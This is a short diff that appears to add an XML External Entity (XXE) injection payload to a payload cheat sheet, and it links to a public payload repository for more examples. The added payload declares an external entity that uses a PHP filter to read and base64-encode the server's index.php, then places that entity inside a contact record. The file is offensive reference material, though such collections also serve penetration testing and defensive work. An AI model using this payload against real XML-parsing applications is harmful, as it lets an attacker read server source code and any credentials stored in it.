@@ -13,4 +13,13 @@
   <Content>&test;</Content>
  </userInfo>
 
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<contacts>
+  <contact>
+    <name>Jean &xxe; Dupont</name>
+    <zipcode>75000</zipcode>
+    <city>Paris</city>
+  </contact>
+</contacts>
+
 #for other examples check https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
